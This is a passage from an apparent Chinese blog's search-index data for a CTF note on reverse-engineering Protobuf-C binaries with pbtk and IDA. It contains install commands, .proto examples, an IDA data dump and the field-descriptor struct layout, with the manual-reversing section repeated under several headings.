Protobuf-C 库。 然后就可以看到，我们生成了一个pwn文件 ","date":"2026-02-02","objectID":"/posts/protobuf/:0:1","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#安装使用"},{"categories":["pwn"],"collections":null,"content":"基础知识\rProto2: 支持 required 和 optional 修饰符。 Proto3: 默认所有字段为 optional，不支持 required ","date":"2026-02-02","objectID":"/posts/protobuf/:0:2","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#基础知识"},{"categories":["pwn"],"collections":null,"content":"工具逆向\rpbtk逆向protobuf的工具 安装 sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5 sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client git clone https://github.com/marin-m/pbtk cd pbtk 使用： # 从二进制文件中提取 .proto 定义 ./extractors/from_binary.py /path/to/binary # 从 JAR/APK 提取 ./extractors/jar_extract.py /path/to/app.apk # 从网页提取 JsProtoUrl ./extractors/web_extract.py https://example.com/proto-endpoint 也可以创建软链接使用，注意这里要用绝对路径 sudo ln -s /home/ctf/pbtk/extractors/from_binary.py /usr/local/bin/from_binary 然后就可以直接这样使用： from_binary ./pwn 注意 $ strings ./pwn | grep -i \"\\.proto\" 如果没有就用不了 ","date":"2026-02-02","objectID":"/posts/protobuf/:0:3","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#工具逆向"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#手动逆向"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#message"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#成员"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#字段描述符"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { unsi","date":"2026-02-02","objectID":"/posts/protobuf/:0:4","tags":null,"title":"Protobuf笔记","uri":"/posts/protobuf/#id"},{"categories":["pwn"],"collections":null,"content":"手动逆向\rmessage\rsyntax = \"proto2\"; message Message_request{ required int32 id = 1; required string sender = 2; required uint32 len = 3; required bytes content = 4; required int32 actionid = 5; } message Message_response{ required int32 id = 1; required string receiver = 2; required int32 status_code = 3; optional string error_message = 4; } 如果定义了两个message，我们去IDA中查看字符串，搜索message就会发现： 这里会出现message的名字，并知道定义了几个message 成员\r一般从rodata从上往下看，看到的第一个一般都是string中的第一个，这里的第一个就是message_request。在IDA里： 往下找还能找到另一个message的成员： 因为上面有id了，这里的id就不会显示 更准确的查看成员的话，可以点击旁边的; DATA XREF: .data.rel.ro:0000000000003CD0↓o，就能查看引用 这会跳到.data.rel.ro段，跳到的这里，一片地址都是同一个message的成员 字段描述符\r了解完有哪些message，每个message有哪些成员，接下来就是每个成员的类型 这就要到.data.rel.ro去看了 proto文件： syntax = \"proto2\"; message User { required int32 id = 1; required string name = 2; optional string email = 3; } message User2 { required int32 id_2 = 1; required string name = 2; optional string email_2 = 3; } 用IDA打开 这里取User的name成员来分析 .data.rel.ro:0000000000003A68 dq offset aName ; \"name\" .data.rel.ro:0000000000003A70 db 2 .data.rel.ro:0000000000003A71 db 0 .data.rel.ro:0000000000003A72 db 0 .data.rel.ro:0000000000003A73 db 0 .data.rel.ro:0000000000003A74 db 0 .data.rel.ro:0000000000003A75 db 0 .data.rel.ro:0000000000003A76 db 0 .data.rel.ro:0000000000003A77 db 0 .data.rel.ro:0000000000003A78 db 0Eh .data.rel.ro:0000000000003A79 db 0 .data.rel.ro:0000000000003A7A db 0 .data.rel.ro:0000000000003A7B db 0 .data.rel.ro:0000000000003A7C db 0 .data.rel.ro:0000000000003A7D db 0 .data.rel.ro:0000000000003A7E db 0 .data.rel.ro:0000000000003A7F db 0 .data.rel.ro:0000000000003A80 db 20h .data.rel.ro:0000000000003A81 db 0 .data.rel.ro:0000000000003A82 db 0 .data.rel.ro:0000000000003A83 db 0 .data.rel.ro:0000000000003A84 db 0 .data.rel.ro:0000000000003A85 db 0 .data.rel.ro:0000000000003A86 db 0 .data.rel.ro:0000000000003A87 db 0 .data.rel.ro:0000000000003A88 db 0 .data.rel.ro:0000000000003A89 db 0 .data.rel.ro:0000000000003A8A db 0 .data.rel.ro:0000000000003A8B db 0 .data.rel.ro:0000000000003A8C db 0 .data.rel.ro:0000000000003A8D db 0 .data.rel.ro:0000000000003A8E db 0 .data.rel.ro:0000000000003A8F db 0 .data.rel.ro:0000000000003A90 db 0 .data.rel.ro:0000000000003A91 db 0 .data.rel.ro:0000000000003A92 db 0 .data.rel.ro:0000000000003A93 db 0 .data.rel.ro:0000000000003A94 db 0 .data.rel.ro:0000000000003A95 db 0 .data.rel.ro:0000000000003A96 db 0 .data.rel.ro:0000000000003A97 db 0 .data.rel.ro:0000000000003A98 db 0 .data.rel.ro:0000000000003A99 db 0 .data.rel.ro:0000000000003A9A db 0 .data.rel.ro:0000000000003A9B db 0 .data.rel.ro:0000000000003A9C db 0 .data.rel.ro:0000000000003A9D db 0 .data.rel.ro:0000000000003A9E db 0 .data.rel.ro:0000000000003A9F db 0 .data.rel.ro:0000000000003AA0 db 0 .data.rel.ro:0000000000003AA1 db 0 .data.rel.ro:0000000000003AA2 db 0 .data.rel.ro:0000000000003AA3 db 0 .data.rel.ro:0000000000003AA4 db 0 .data.rel.ro:0000000000003AA5 db 0 .data.rel.ro:0000000000003AA6 db 0 .data.rel.ro:0000000000003AA7 db 0 .data.rel.ro:0000000000003AA8 db 0 .data.rel.ro:0000000000003AA9 db 0 .data.rel.ro:0000000000003AAA db 0 .data.rel.ro:0000000000003AAB db 0 .data.rel.ro:0000000000003AAC db 0 .data.rel.ro:0000000000003AAD db 0 .data.rel.ro:0000000000003AAE db 0 .data.rel.ro:0000000000003AAF db 0 这里其实就是对应这个结构体（proto3去掉了default_value字段）： struct ProtobufCFieldDescriptor { const char *name; // 0x00 - 指向字段名的字符串 unsigned int id; // 0x08 - 字段编号 unsigned int label; // 0x0C - required/optional/repeated unsigned int type; // 0x10 - protobuf 类型 (int32=1, string=14 等) unsigned int quantifier_offset; // 0x14 - has_xxx 或 array length 偏移 unsigned int offset; // 0x18 - 在 message struct 里的偏移 unsigned int _pad0; // 0x1C - 对齐 const void *descriptor; // 0x20 - 嵌套 message/enum 描述符 const void *default_value; // 0x28 - 默认值 unsigned int flags; // 0x30 unsigned int reserved; // 0x34 }; 导入IDA的话： typedef void (__fastcall *ProtobufCMessageInit)(void *msg); struct ProtobufCIntRange { int start_value; int orig_index; }; struct ProtobufCFieldDescriptor { 